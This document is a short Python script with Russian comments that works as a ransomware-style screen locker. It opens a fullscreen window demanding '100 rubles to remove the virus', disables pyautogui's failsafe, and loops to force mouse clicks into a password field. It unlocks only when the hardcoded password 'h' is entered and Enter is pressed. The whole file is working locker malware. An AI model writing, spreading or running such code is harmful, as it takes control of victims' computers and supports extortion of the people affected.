import pyautogui
import time
from tkinter import Tk, Entry, Label
from pyautogui import click, moveTo

def stopLocker(event):
	global stop, entry
	if entry.get() == 'h':
		stop = False

# Создаем окно
root = Tk()

# Открываем окно на весь экран
root.attributes("-fullscreen", True)
#---------------------------------

x=root.winfo_screenwidth()
y=root.winfo_screenheight()

# Создаем текстовые подписи и задаем их расположение
label_0 = Label(root, text="Введите 100 рублей чтобы убрать вирус", font='Arial 20')
label_0.grid(row=0, column=0)
label_1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial 20')
label_1.place(x=x/2-160, y=y/2-40)

# Создаем поле для ввода, задаем его размеры и расположение
entry = Entry(root, font=1)
entry.place(x=x/2-150, y=y/2+20)

# Вырубаем защиту левого верхнего угла экрана
pyautogui.FAILSAFE = False
#---------------------------------
stop = True
while stop == True:
	root.update()
	# Кликаем в центр окна
	click(x=x/2-150, y=y/2+20)
	
	# Добавляем сочетание клавиш, которые будут закрывать программу
	root.bind('<Return>', stopLocker)
